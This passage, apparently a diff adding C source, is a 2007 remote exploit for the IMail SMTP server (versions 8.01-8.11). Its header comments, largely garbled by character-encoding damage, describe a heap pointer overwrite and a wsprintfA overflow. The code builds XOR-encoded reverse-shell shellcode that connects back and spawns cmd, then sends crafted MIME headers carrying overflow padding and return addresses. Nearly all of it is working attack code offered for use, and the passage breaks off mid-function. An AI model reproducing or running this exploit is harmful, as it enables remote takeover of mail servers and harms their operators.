@@ -1,0 +1,1189 @@
+/*
+
+  by axis
+  2007-06-05
+  http://www.ph4nt0m.org
+  Mail-List: http://list.ph4nt0m.org
+
+
+  ÒÔÇ°ÓÐÕâžöÒ»žöimailµÄexp
+PRIVATE Remote Exploit  For IMAIL Smtp Server(1.2)
+This is For imail 8.01-8.11 version
+Usage:faint.exe -d <host> [options]
+Options:
+        -d:             Hostname to attack [Required]
+        -t:             Type [Default: 0]
+        -p:             Attack port [Default: 25]
+        -S:             the IP connect back to.
+        -P:             the port connect back to.
+Types:
+        0: win2k All version , IMail 8.01-11
+
+  ²»ÖªµÀÊÇÄÄÎ»ŽóÅ£ÐŽµÄ
+
+×îœü¿ŽÁË¿Ž£¬
+
+·Ç³£ºÃÍæµÄÒ»žöÂ©¶Ž¡£
+
+Â©¶ŽÊÇ·¢ÉúÔÚiaspam.dllÀï
+
+loc_1001ada5       ==> ×¢Òâ¶¯Ì¬µ÷ÊÔÊ±ºò×¢ÒâŒÓÔØ»ùÖ·µÄ²»Í¬¡£
+mov    eax, [ebp+var_54]
+mov    ecx, [eax+10c8h]
+push   ecx                 ; char *
+mov    edx, [ebp+var_54]
+mov    eax, [edx+10d0h]
+push   eax                 ; char *
+call   _strcpy
+add    esp, 8
+jmp    loc_1001a6f0
+
+
+  ÕâÀïstrcpyµÄÁœžöbuffer£¬srcºÍdstµÄÖžÕë£¬ŸÓÈ»ÊÇÖ±œÓŽÓ¶ÑÀï¶Á³öÀŽµÄ¡£
+  ¶øÖ®Ç°Ã»ÓÐ×öÈÎºÎŒì²é
+
+  ËùÒÔ·¢ËÍžöÓÊŒþµœ·þÎñÆ÷£¬SMDÎÄŒþ
+
+  È»ºóÔÚÆäºóµÄÆ«ÒÆŽŠ¿ØÖÆÕâÁœžöµØÖ·£¬ŸÍ¿ÉÒÔ¿œ±ŽÈÎÒâ×Ö·ûŽ®µœÈÎÒâÄÚŽæ¡£
+
+  badcharÊÇ 0x00 0x0a  emmËµ»¹ÓÐžö 0x25,²»¹ýÎÒÃ»ÕÒµœ¡£
+
+
+  ÒÔÇ°ÍøÉÏÄÇžö·ŽÁ¬µÄ°æ±Ÿ£¬ÊÇÀûÓÃÁËž²žÇpebÀïµÄÖžÕë¡£
+
+  ÕâÖÖ·œ·šÔÚ2003ÉÏ²»ÄÜÓÃ¡£
+
+  ÕâÀïÎÒ²ÉÓÃÁËemmµÄ·œ·š£¬¹¹ÔìÁËÒ»žöÒç³ö
+
+  ÒòÎªimailsec.dllµÄ.data¶Î¿ÉÐŽ¡£
+
+  ËùÒÔÎÒÕÒµœÁËÕâÃŽÒ»žöµØ·œ
+
+1000CB5D    8B45 08         MOV EAX,DWORD PTR SS:[EBP+8]
+1000CB60    50              PUSH EAX
+1000CB61    8B0D 6C540310   MOV ECX,DWORD PTR DS:[1003546C]          ; IMailsec.1003549C
+1000CB67    51              PUSH ECX
+1000CB68    8D95 FCFDFFFF   LEA EDX,DWORD PTR SS:[EBP-204]
+1000CB6E    52              PUSH EDX
+1000CB6F    FF15 F8D30210   CALL DWORD PTR DS:[<&USER32.wsprintfA>]  ; USER32.wsprintfA
+
+
+  ÆäÖÐÖžÕëDWORD PTR DS:[1003546C] ÔÚimailsec.dllµÄ.dataÖÐ£¬ÕâžöµØÖ·¿ÉÒÔ±»ÎÒÃÇž²žÇ¡£
+
+  ËùÒÔÎÒÃÇŸÍ¿ÉÒÔ¹¹ÔìÒ»žöÒç³ö¡£
+
+  ËŒÂ·ÈçÏÂ£º
+  µÚÒ»·âÓÊŒþ£º ·¢ËÍshellcodeµœÄÚŽæÖÐ±£ŽæºÃ¡£ÕâÀïÎÒ·ÅµœÁËtebÖÐ
+  µÚ¶þ·âÓÊŒþ£º ·¢ËÍÒç³öÐèÒªµÄž²žÇ×Ö·ûŽ®µœÄÚŽæÖÐ±£ŽæºÃ¡£ÕâÀïÎÒÒ²·ÅÔÚÁËtebÖÐ
+  µÚÈý·âÓÊŒþ£º ž²žÇimailsec.dllÖÐµÄ .data¶ÎµÄÖžÕë£¬Ê¹wsprintfAÔì³ÉÒç³ö
+
+  Òç³öž²žÇÊ¹ÓÃµÄ×Ö·ûŽ®ÊÇµÚ¶þ·âÓÊŒþ·¢ËÍ¹ýÈ¥µÄ£¬ž²žÇºóµÄ·µ»ØµØÖ·Ö±œÓÖžÏòÁËµÚÒ»·âÓÊŒþ·¢ËÍ¹ýÈ¥µÄshellcodeÔÚÄÚŽæÖÐµÄµØÖ·¡£
+
+  ËùÒÔÕâžöÂ©¶ŽÊÇºÍÆœÌšÎÞ¹ØµÄ£¡£¡²»ÐèÒªÈÎºÎopcode£¡£¡
+
+  ÔÚÊµŒÊÀûÓÃÊ±ÎÒ·¢ËÍÁË4·âÓÊŒþ£¬µÚÒ»·âÊÇ·ÏÓÊŒþ£¬ÓÃÓÚÌážß³É¹ŠÂÊ¡£
+
+
+  ÓÉÓÚ»¥ÁªÍøµÄspam·ºÀÄ£¬ËùÒÔµÈµœÓÊŒþ·þÎñÆ÷ŽŠÀíÂ©¶ŽÓÊŒþÊ±£¬Ò²ÐíÒÑŸ­¹ýÁËŒžžöÔÂÁË¡£¡£¡£
+
+  ËùÒÔ×îºÃµÄ·œ°žÊÇÊ¹ÓÃdownload+exec µÄshellcode¡£
+
+  ÕâÀïžø³öÒ»žö±ÈœÏÀÃµÄ·ŽÁ¬shellcode×÷Îªpoc¡£
+
+
+  ŸÝemmËµÕâžöÂ©¶ŽÒ»Ö±Ã»²¹£¬Ö»ÊÇžß°æ±ŸÃ»ÓÐÁË¡£¡£¡£
+
+  */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <windows.h>
+#include <winsock.h>
+#include <io.h>
+
+#pragma comment (lib,"ws2_32")
+
+
+char *szEHLO = "HELO\r\n";
+char *szMF = "MAIL FROM <fucker@fuckimail.org>\r\n";
+char *szRCPT = "RCPT TO: <postmaster>\r\n";
+char *szDATA = "DATA\r\n";
+char *szTIME = "Date: Thu, 1 Oct 2007 07:06:09 +0800\r\n";
+char *szMIME = "MIME\r\n";
+char *szEND = ".\r\n";
+char *szQUIT = "QUIT\r\n";
+char *szCT = "Content-Type: multipart/boundary=";
+char *szCTE = "Content-Transfer-Encoding:";
+
+//#define  SCaddr  "\x50\xe7\x03\x10"
+#define  SCaddr  "\x50\xc8\xfd\x7f"
+#define  Fuck_ptr "\x6c\x54\x03\x10"   //0x1003546c
+#define  Teb_temp1  0x7ffdd050 
+#define  Teb_temp2  0x7ffdd040 
+#define  Teb_temp3  0x7ffdd030 
+
+
+unsigned short port = 25;
+unsigned char payload[5000] = "";
+
+
+
+#define PROC_BEGIN __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
+                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
+#define PROC_END PROC_BEGIN
+
+unsigned char sh_Buff[2048];
+unsigned int  sh_Len;
+unsigned int  Enc_key=0x99;        //ÆäÊµÎÞ¹ØœôÒª,¶¯Ì¬Ñ°ÕÒ
+
+
+
+
+
+unsigned char decode1[] =
+/*
+00401004   . /EB 0E         JMP SHORT encode.00401014
+00401006   $ |5B            POP EBX
+00401007   . |4B            DEC EBX
+00401008   . |33C9          XOR ECX,ECX
+0040100A   . |B1 FF         MOV CL,0FF
+0040100C   > |80340B 99     XOR BYTE PTR DS:[EBX+ECX],99
+00401010   .^|E2 FA         LOOPD SHORT encode.0040100C
+00401012   . |EB 05         JMP SHORT encode.00401019
+00401014   > \E8 EDFFFFFF   CALL encode.00401006
+*/
+"\xEB\x0E\x5B\x4B\x33\xC9\xB1"
+"\xFF"          // shellcode size
+"\x80\x34\x0B"
+"\xB8"          // xor byte
+"\xE2\xFA\xEB\x05\xE8\xED\xFF\xFF\xFF";
+
+unsigned char decode2[] =
+/*
+00406030   /EB 10           JMP SHORT 00406042
+00406032   |5B              POP EBX
+00406033   |4B              DEC EBX
+00406034   |33C9            XOR ECX,ECX
+00406036   |66:B9 6601      MOV CX,166
+0040603A   |80340B 99       XOR BYTE PTR DS:[EBX+ECX],99
+0040603E  ^|E2 FA           LOOPD SHORT 0040603A
+00406040   |EB 05           JMP SHORT 00406047
+00406042   \E8 EBFFFFFF     CALL 00406032
+*/
+"\xEB\x10\x5B\x4B\x33\xC9\x66\xB9"
+"\x66\x01"      // shellcode size
+"\x80\x34\x0B"
+"\xB8"          // xor byte
+"\xE2\xFA\xEB\x05\xE8\xEB\xFF\xFF\xFF";
+
+// kernel32.dll functions index
+#define _LoadLibraryA			0x00
+#define _CreateProcessA			0x04
+//#define _ExitProcess			0x08
+#define _ExitThread 			0x08
+#define	_WaitForSingleObject	0x0C
+// ws2_32.dll functions index
+#define _WSASocketA				0x10
+#define _connect				0x14
+#define _closesocket			0x18
+//#define _WSAStartup			0x1C
+
+// functions number
+#define _Knums                  4
+#define _Wnums                  3
+
+// Need functions
+unsigned char functions[100][128] =         
+{                                           // [esi] stack layout
+    // kernel32 4                           // 00 kernel32.dll
+    {"LoadLibraryA"},                       //    [esi]
+    {"CreateProcessA"},                     //    [esi+4]       
+    {"ExitThread"},                         //    [esi+8]
+    //{"ExitProcess"},
+    //{"TerminateProcess"},
+    {"WaitForSingleObject"},                //    [esi+12] 
+
+    // ws2_32  3                            // 01 ws2_32.dll
+    {"WSASocketA"},                         //    [esi+16]     
+    {"connect"},                            //    [esi+20]		
+    {"closesocket"},                        //    [esi+24]
+    //{"WSAStartup"},                       //    [esi+28]
+    {""},
+};
+
+void PrintSc(unsigned char *lpBuff, int buffsize);
+void ShellCode();
+
+// Get function hash
+unsigned long hash(unsigned char *c)
+{
+    unsigned long h=0;
+    while(*c)
+    {
+        h = ( ( h << 25 ) | ( h >> 7 ) ) + *c++;
+    }
+    return h;
+}
+
+// get shellcode
+void GetShellCode(char* ipstr, short port)
+{
+    char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
+    unsigned char  *pSc_addr;
+    unsigned char  pSc_Buff[2048];
+    unsigned int   MAX_Sc_Len=0x2000;
+    unsigned long  dwHash[100];
+    unsigned int   dwHashSize;
+
+    unsigned int l,i,j,k;
+
+	char *p;
+	int ip;
+
+    // Get functions hash
+    for (i=0;;i++) {
+        if (functions[i][0] == '\x0') break;
+
+        dwHash[i] = hash(functions[i]);
+        //fprintf(stderr, "%.8X\t%s\n", dwHash[i], functions[i]);
+    }
+    dwHashSize = i*4;
+
+    // Deal with shellcode
+    pSc_addr = (unsigned char *)ShellCode;
+
+    for (k=0;k<MAX_Sc_Len;++k ) {
+        if(memcmp(pSc_addr+k,fnbgn_str, 8)==0) {
+            break;
+        }
+    }
+    pSc_addr+=(k+8);   // start of the ShellCode
+    
+    for (k=0;k<MAX_Sc_Len;++k) {
+        if(memcmp(pSc_addr+k,fnend_str, 8)==0) {
+            break;
+        }
+    }
+    sh_Len=k; // length of the ShellCode
+    
+    memcpy(pSc_Buff, pSc_addr, sh_Len);
+
+	for(k=0; k<sh_Len; ++k)
+	{
+		if(memcmp(pSc_Buff+k, "\x68\x7F\x00\x00\x01", 5) == 0)
+		{
+			ip = inet_addr(ipstr);
+			p = (char*)&ip;
+			pSc_Buff[k+1] = p[0];
+			pSc_Buff[k+2] = p[1];
+			pSc_Buff[k+3] = p[2];
+			pSc_Buff[k+4] = p[3];
+		}
+		if(memcmp(pSc_Buff+k, "\x68\x02\x00\x00\x35", 5) == 0)
+		{
+			p = (char*)&port;
+			pSc_Buff[k+3] = p[1]; 
+			pSc_Buff[k+4] = p[0];
+		}
+	}
+
+    // Add functions hash
+    memcpy(pSc_Buff+sh_Len, (unsigned char *)dwHash, dwHashSize);
+    sh_Len += dwHashSize;
+
+    //printf("%d bytes shellcode\n", sh_Len);
+    // print shellcode
+    //PrintSc(pSc_Buff, sh_Len);
+
+    // find xor byte
+    for(i=0xff; i>0; i--)
+    {
+        l = 0;
+        for(j=0; j<sh_Len; j++)
+        {
+            if ( 
+//                   ((pSc_Buff[j] ^ i) == 0x26) ||    //%
+//                   ((pSc_Buff[j] ^ i) == 0x3d) ||    //=
+    //               ((pSc_Buff[j] ^ i) == 0x3f) ||    //?
+                   //((pSc_Buff[j] ^ i) == 0x40) ||    //@
+                   ((pSc_Buff[j] ^ i) == 0x00) ||
+				   //((pSc_Buff[j] ^ i) == 0x3c) ||
+				   //((pSc_Buff[j] ^ i) == 0x3e) ||
+	//			   ((pSc_Buff[j] ^ i) == 0x2f) ||
+	//			   ((pSc_Buff[j] ^ i) == 0x22) ||
+	//			   ((pSc_Buff[j] ^ i) == 0x2a) ||
+				   //((pSc_Buff[j] ^ i) == 0x3a) ||
+	//			   ((pSc_Buff[j] ^ i) == 0x20) ||
+	               ((pSc_Buff[j] ^ i) == 0x25) ||
+                   ((pSc_Buff[j] ^ i) == 0x0D) ||
+                   ((pSc_Buff[j] ^ i) == 0x0A) 
+    //               ((pSc_Buff[j] ^ i) == 0x5C)
+                )
+            {
+                l++;
+                break;
+            };
+        }
+
+        if (l==0)
+        {
+            Enc_key = i;
+            //printf("Find XOR Byte: 0x%02X\n", i);
+            for(j=0; j<sh_Len; j++)
+            {
+                pSc_Buff[j] ^= Enc_key;
+            }
+
+            break;                        // break when found xor byte
+        }
+    }
+
+    // No xor byte found
+    if (l!=0){
+        //fprintf(stderr, "No xor byte found!\n");
+
+        sh_Len  = 0;
+    }
+    else {
+        //fprintf(stderr, "Xor byte 0x%02X\n", Enc_key);
+
+        // encode
+        if (sh_Len > 0xFF) {
+            *(unsigned short *)&decode2[8] = sh_Len;
+            *(unsigned char *)&decode2[13] = Enc_key;
+
+            memcpy(sh_Buff, decode2, sizeof(decode2)-1);
+            memcpy(sh_Buff+sizeof(decode2)-1, pSc_Buff, sh_Len);
+            sh_Len += sizeof(decode2)-1;
+        }
+        else {
+            *(unsigned char *)&decode1[7]  = sh_Len;
+            *(unsigned char *)&decode1[11] = Enc_key;
+
+            memcpy(sh_Buff, decode1, sizeof(decode1)-1);
+            memcpy(sh_Buff+sizeof(decode1)-1, pSc_Buff, sh_Len);
+            sh_Len += sizeof(decode1)-1;
+        }
+    }
+}
+
+// print shellcode
+void PrintSc(unsigned char *lpBuff, int buffsize)
+{
+    int i,j;
+    char *p;
+    char msg[4];
+
+    printf("/* %d bytes */\n",buffsize);
+    for(i=0;i<buffsize;i++)
+    {
+        if((i%16)==0)
+            if(i!=0)
+                printf("\"\n\"");
+            else
+                printf("\"");
+        sprintf(msg,"\\x%.2X",lpBuff[i]&0xff);
+        for( p = msg, j=0; j < 4; p++, j++ )
+        {
+            if(isupper(*p))
+                printf("%c", _tolower(*p));
+            else
+                printf("%c", p[0]);
+        }
+    }
+   printf( "\";\n");
+}
+
+// ShellCode function
+void ShellCode()
+{
+    __asm
+    {
+        PROC_BEGIN                          // C macro to begin proc
+
+        jmp     sc_end       
+sc_start:         
+        pop     edi                         // Hash string start addr (esp -> edi)
+
+        // Get kernel32.dll base addr
+        mov     eax, fs:0x30                // PEB
+        mov     eax, [eax+0x0c]             // PROCESS_MODULE_INFO
+        mov     esi, [eax+0x1c]             // InInitOrder.flink 
+        lodsd                               // eax = InInitOrder.blink
+        mov     ebp, [eax+8]                // ebp = kernel32.dll base address
+
+        mov     esi, edi                    // Hash string start addr -> esi
+    
+    // Get function addr of kernel32
+        push    _Knums
+        pop     ecx
+        
+	get_kernel32:
+        call    GetProcAddress_fun
+        loop    get_kernel32
+
+        // Get ws2_32.dll base addr
+        push    0x00003233
+        push    0x5f327377
+        push    esp
+        call    dword ptr [esi+_LoadLibraryA]         // LoadLibraryA("ws2_32");
+        
+        //mov     ebp, eax                   // ebp = ws2_32.dll base address
+        xchg    eax, ebp
+
+   // Get function addr of ws2_32
+        push    _Wnums
+        pop     ecx
+
+    get_ws2_32:
+        call    GetProcAddress_fun
+        loop    get_ws2_32
+
+
+//
+/*     
+//LWSAStartup:
+        sub     esp, 400
+        push    esp
+        push    0x101
+        call    dword ptr [esi+_WSAStartup]             // WSAStartup(0x101, &WSADATA);
+//
+*/
+
+//LWSASocketA:
+        push    ecx
+        push    ecx
+        push    ecx
+        push    ecx
+
+        push    1
+        push    2
+        call    dword ptr [esi+_WSASocketA]   // s=WSASocketA(2,1,0,0,0,0);
+
+        //mov     ebx, eax                    // socket -> ebx
+        xchg    eax, ebx
+		
+//Lconnect:
+		//int 3
+        push    0x0100007F 					// host: 127.0.0.1 
+        push    0x35000002 					// port: 53 
+        mov     ebp, esp
+        
+        push    0x10                        // sizeof(sockaddr_in)
+        push    ebp                         // sockaddr_in address
+        push    ebx                         // socket s
+        call    dword ptr [esi+_connect]    // connect(s, name, sizeof(name));
+
+        // if connect failed , exit
+        test    eax, eax
+        jne     Finished
+		
+//        xor     eax, eax
+        
+        // allot memory for STARTUPINFO, PROCESS_INFORMATION
+        mov     edi, esp
+           
+        // zero out SI/PI
+        push    0x12
+        pop     ecx
+    stack_zero:
+        stosd
+        loop    stack_zero
+        
+        //mov     byte ptr [esp+0x10], 0x44   // si.cb = sizeof(si)
+        //inc     byte ptr [esp+0x3C]         // si.dwFlags
+        //inc     byte ptr [esp+0x3D]         // si.wShowWindow
+        //mov     [esp+0x48], ebx             // si.hStdInput = s
+        //mov     [esp+0x4C], ebx             // si.hStdOutput = s
+        //mov     [esp+0x50], ebx             // si.hStdError = s
+        
+        mov     word ptr  [esp+0x3c], 0x0101
+        xchg    eax, ebx
+        stosd
+        stosd
+        stosd
+    
+        mov     edi, esp
+    
+        // push "cmd"
+        push    0x00646d63                  // "cmd"
+        mov     ebp, esp
+
+        push    eax                         // socket
+		
+//LCreateProcess:
+        lea     eax, [edi+0x10]                    
+        push    edi                         // pi
+        push    eax                         // si
+        push    ecx                         // lpCurrentDirectory
+        push    ecx                         // lpEnvironment
+        push    ecx                         // dwCreationFlags
+        push    1                           // bInheritHandles
+        push    ecx                         // lpThreadAttributes
+        push    ecx                         // lpProcessAttributes
+        push    ebp                         // lpCommandLine =  "cmd"
+        push    ecx                         // lpApplicationName NULL
+        call    dword ptr [esi+_CreateProcessA]         // CreactProcessA(NULL,"CMD",0,0,1,0,0,0,si, pi);
+    
+//LWaitForSingleObject:
+        //push    1  
+        push    0xFFFFFFFF
+        push    dword ptr [edi]
+        call    dword ptr [esi+_WaitForSingleObject]    // WaitForSingleObject(Handle, time) ;
+
+//LCloseSocket:
+        //push    ebx
+        call    dword ptr [esi+_closesocket]           // closesocket(c);
+
+Finished:
+		// »ÖžŽ¹¹ÔìµÄÒç³öµã
+		mov     eax, 0x1003546c
+		mov     DWORD ptr [eax],    0x1003549c
+		mov     DWORD ptr [eax+4],  0x100354c8
+		mov     DWORD ptr [eax+8],  0x100354e0
+
+
+
+        //push    1
+        //call    dword ptr [esi+_ExitProcess]            // ExitProcess();
+		xor     eax, eax
+		push    eax
+		call    dword ptr [esi+_ExitThread]
+
+// 
+GetProcAddress_fun:    
+        push    ecx
+        push    esi
+    
+        mov     esi, [ebp+0x3C]             // e_lfanew
+        mov     esi, [esi+ebp+0x78]         // ExportDirectory RVA
+        add     esi, ebp                    // rva2va
+        push    esi
+        mov     esi, [esi+0x20]              // AddressOfNames RVA
+        add     esi, ebp                    // rva2va
+        xor     ecx, ecx
+        dec     ecx
+
+    find_start:
+        inc     ecx
+        lodsd
+        add     eax, ebp
+        xor     ebx, ebx
+        
+    hash_loop:
+        movsx   edx, byte ptr [eax]
+        cmp     dl, dh
+        jz      short find_addr
+        ror     ebx, 7               // hash key
+        add     ebx, edx
+        inc     eax
+        jmp     short hash_loop
+     
+    find_addr:
+        cmp     ebx, [edi]                  // compare to hash
+        jnz     short find_start
+        pop     esi                         // ExportDirectory
+                    // AddressOfNameOrdinals RVA
+/*
+//--------------------------------------------------------
+		jmp over_it
+		__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 
+		__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40
+		__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 
+		__asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 __asm _emit 0x40 
+//--------------------------------------------------------
+
+over_it:
+*/
+		mov     ebx, [esi+0x24] 
+        add     ebx, ebp                    // rva2va
+        mov     cx, [ebx+ecx*2]             // FunctionOrdinal
+        mov     ebx, [esi+0x1C]             // AddressOfFunctions RVA
+        add     ebx, ebp                    // rva2va
+        mov     eax, [ebx+ecx*4]            // FunctionAddress RVA
+        add     eax, ebp                    // rva2va
+        stosd                               // function address save to [edi]
+        
+        pop     esi
+        pop     ecx
+        ret
+        
+sc_end:
+        call sc_start
+       
+        PROC_END                            //C macro to end proc
+    }
+}
+
+
+
+
+
+// ripped from isno
+int Make_Connection(char *address,int port,int timeout)
+{
+    struct sockaddr_in target;
+    SOCKET s;
+    int i;
+    DWORD bf;
+    fd_set wd;
+    struct timeval tv;
+
+    s = socket(AF_INET,SOCK_STREAM,0);
+    if(s<0)
+        return -1;
+
+    target.sin_family = AF_INET;
+    target.sin_addr.s_addr = inet_addr(address);
+    if(target.sin_addr.s_addr==0)
+    {
+        closesocket(s);
+        return -2;
+    }
+    target.sin_port = htons((short)port);
+    bf = 1;
+    ioctlsocket(s,FIONBIO,&bf);
+    tv.tv_sec = timeout;
+    tv.tv_usec = 0;
+    FD_ZERO(&wd);
+    FD_SET(s,&wd);
+    connect(s,(struct sockaddr *)&target,sizeof(target));
+    if((i=select(s+1,0,&wd,0,&tv))==(-1))
+    {
+        closesocket(s);
+        return -3;
+    }
+    if(i==0)
+    {
+        closesocket(s);
+        return -4;
+    }
+    i = sizeof(int);
+    getsockopt(s,SOL_SOCKET,SO_ERROR,(char *)&bf,&i);
+    if((bf!=0)||(i!=sizeof(int)))
+    {
+        closesocket(s);
+        return -5;
+    }
+    ioctlsocket(s,FIONBIO,&bf);
+    return s;
+}
+
+
+
+
+void Disconnect(SOCKET s)
+{
+	closesocket(s);
+	WSACleanup();
+}
+
+
+
+void help(char *n)
+{
+	printf("==Usage:\n");
+	printf("%s [target ip] [target port] [local ip] [local port]\n\n", n);
+	printf("We will send 4 mail to trigger the vuln.\n");
+	printf("The fucking vuln will be triggered when the mail server handling the mail.\n");
+	printf("Because of the Spam in the internet,\nthe vuln maybe triggered after a few days!!Fuck!!\n\n");
+
+}
+
+
+int sendfuckingmail(int the_mail, char *target, int tg_port)
+{
+	SOCKET  s;
+	WSADATA WSAData;
+	char buffer[1000] = {0};    // ÁÙÊ±bufferÓÃÓÚio
+	int  ret;
+
+	char padding[5000] = {0};   // paddingÓÃÓÚÌî³ä
+
+	if(WSAStartup (MAKEWORD(1,1), &WSAData) != 0)
+	{
+		fprintf(stderr, "[-] WSAStartup failed.\n");
+		WSACleanup();
+		exit(1);
+	}
+
+
+	s = Make_Connection(target, tg_port, 10);
+	if(s<0)
+	{
+		fprintf(stderr, "[-] connect err.\n");
+		exit(1);
+	}
+    
+
+	recv(s, buffer, sizeof(buffer), 0);
+	Sleep(1000);
+  
+    ret = strlen(buffer);	
+
+	if ( ret < 10 )
+	{		
+		printf("[-]Seems Service Down~ :( \n");
+		Disconnect(s);
+		return -1;		
+	}
+
+
+	printf("[+]Got Banner: %s", buffer);
+
+
+
+	// HELO
+	send(s, szEHLO, strlen(szEHLO), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+//	printf("%s", buffer);
+    printf("[+]Say hello to Server.\n");
+	memset(buffer, 0, sizeof(buffer));
+
+	// MAIL FROM
+	Sleep(500);
+	send(s, szMF, strlen(szMF), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+	if(strstr(buffer, "250"))
+	  printf("[+]Recv: %s", buffer);
+	else
+		{
+			printf("[-]Seems Service Down~ :( \n");
+			Disconnect(s);
+			return -1;
+		}
+	memset(buffer, 0, sizeof(buffer));
+
+
+	// RCPT TO
+	Sleep(500);
+	send(s, szRCPT, strlen(szRCPT), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+	if(strstr(buffer, "250"))
+	  printf("[+]Recv: %s", buffer);
+	else
+		{
+			printf("[-]Seems Service Down~ :( \n");
+			Disconnect(s);
+			return -1;
+		}
+	memset(buffer, 0, sizeof(buffer));
+
+
+	// DATA
+	Sleep(500);
+	send(s, szDATA, strlen(szDATA), 0);
+	recv(s, buffer, sizeof(buffer), 0);
+	if(strstr(buffer, "354"))
+	  printf("[+]Recv: %s", buffer);
+	else
+		{
+			printf("[-]Seems Service Down~ :( \n");
+			Disconnect(s);
+			return -1;
+		}
+	memset(buffer, 0, sizeof(buffer));
+
+
+	Sleep(100);
+	// TIME
+	send(s, szTIME, strlen(szTIME), 0);
+//	recv(s, buffer, sizeof(buffer), 0);
+//	printf("%s", buffer);
+    printf("[+]Fucking Server at %s", szTIME);
+	memset(buffer, 0, sizeof(buffer));
+
+	
+
+	Sleep(200);
+
+
+	// ÅÐ¶ÏÊÇµÚŒž·âÓÊŒþ
+	if (the_mail == 0)   // ·¢Ò»·â·ÏÓÊŒþ£¬Ìážß³É¹ŠÂÊ
+	{
+        /*
+           my $padding = "\x22"."B"x2028;
+           my $padding1 = "B"x2046;
+           my $padding11 = "B"x146;   #163žöB
+           my $straddr1 = "\x50\xd0\xfd\x7f"."\x30\xd0\xfd\x7f";     # ÔÚtebÖÐ
+           my $straddr2 = "\x50\xc0\xfd\x7f";     # shellcode»á¿œ±ŽµœµÄµØÖ·
+
+           print $sock "Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n";
+        */
+		memcpy(payload, szCT, strlen((const char *)szCT));
+		//memcpy(payload+strlen(const char *szCT), "\"", 1);
+		memset(padding, 0x43, 5000);
+		padding[0] = '\x22';   
+		padding[2029] = '\x20';
+		padding[4076] = '\x20';
+
+		//straddr1
+		padding[4223] = '\x50';
+		padding[4224] = '\xd0';
+		padding[4225] = '\xfd';
+		padding[4226] = '\x7f';
+		padding[4227] = '\x30';
+		padding[4228] = '\xd0';
+		padding[4229] = '\xfd';
+		padding[4230] = '\x7f';
+
+		//straddr2   0x10036ea0
+		padding[4231] = '\x30';
+		padding[4232] = '\xd8';
+		padding[4233] = '\xfd';
+		padding[4234] = '\x7f';
+
+		padding[4235] = '\x0d';
+		padding[4236] = '\x0a';
+		padding[4237] = '\x00';
+
+		
+		memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		Sleep(100);
+		// MIME
+     	send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
+   //	recv(s, buffer, sizeof(buffer), 0);
+  //	printf("%s", buffer);
+   //     printf("[+]Fucking Server at %s.\n", szTIME);
+   // 	memset(buffer, 0, sizeof(buffer));
+		
+		//print $sock "Content-Transfer-Encoding:$padding2\r\n";
+		memset(padding, 0x43, 80);
+		//memcpy(padding, "\x43", 80);
+		padding[80] = '\x00';
+
+		memset(payload, 0x00, sizeof(payload));
+		memcpy(payload, szCTE, strlen((const char*)szCTE));
+        memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
+        memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), "\r\n", 2);
+
+		Sleep(200);
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		memset(payload, 0x00, sizeof(payload));
+
+	} 
+	else if (the_mail == 1)   // ¹¹ÔìbufferoverflowµÄž²žÇ×Ö·ûŽ®
+	{
+		/*
+           my $padding = "\x22"."B"x2028;
+           my $padding1 = "B"x2046;
+           my $padding11 = "B"x146;   #163žöB
+           my $straddr1 = "\x50\xd0\xfd\x7f"."\x30\xd0\xfd\x7f";     # ÔÚtebÖÐ
+           my $straddr2 = "\x50\xc0\xfd\x7f";     # shellcode»á¿œ±ŽµœµÄµØÖ·
+
+           print $sock "Content-Type: multipart\/boundary=$padding $padding1 $padding11$straddr1$straddr2\r\n";
+        */
+		memcpy(payload, szCT, strlen((const char *)szCT));
+		//memcpy(payload+strlen(const char *szCT), "\"", 1);
+		memset(padding, 0x43, 5000);
+		padding[0] = '\x22';   
+		padding[2029] = '\x20';
+		padding[4076] = '\x20';
+
+		//straddr1
+		padding[4223] = '\x50';
+		padding[4224] = '\xd0';
+		padding[4225] = '\xfd';
+		padding[4226] = '\x7f';
+		padding[4227] = '\x30';
+		padding[4228] = '\xd0';
+		padding[4229] = '\xfd';
+		padding[4230] = '\x7f';
+
+		//straddr2   0x10036ea0
+		padding[4231] = '\x50';
+		padding[4232] = '\xc0';
+		padding[4233] = '\xfd';
+		padding[4234] = '\x7f';
+
+		padding[4235] = '\x0d';
+		padding[4236] = '\x0a';
+		padding[4237] = '\x00';
+
+		
+		memcpy(payload+strlen((const char *)szCT), padding, strlen((const char *)padding));
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+		Sleep(100);
+		// MIME
+     	send(s, (const char *)szMIME, strlen((const char *)szMIME), 0);
+   //	recv(s, buffer, sizeof(buffer), 0);
+  //	printf("%s", buffer);
+   //     printf("[+]Fucking Server at %s.\n", szTIME);
+   // 	memset(buffer, 0, sizeof(buffer));
+		
+		//print $sock "Content-Transfer-Encoding:$padding2\r\n";
+		memset(padding, 0x43, 80);
+		//memcpy(padding, "\x43", 80);
+		padding[80] = '\x00';
+
+		memset(payload, 0x00, sizeof(payload));
+		memcpy(payload, szCTE, strlen((const char*)szCTE));
+        memcpy(payload+strlen((const char*)szCTE), padding, strlen((const char*)padding));
+        memcpy(payload+strlen((const char*)szCTE)+strlen((const char*)padding), "\r\n", 2);
+
+		Sleep(200);
+		send(s, (const char *)payload, strlen((const char *)payload), 0);
+
+
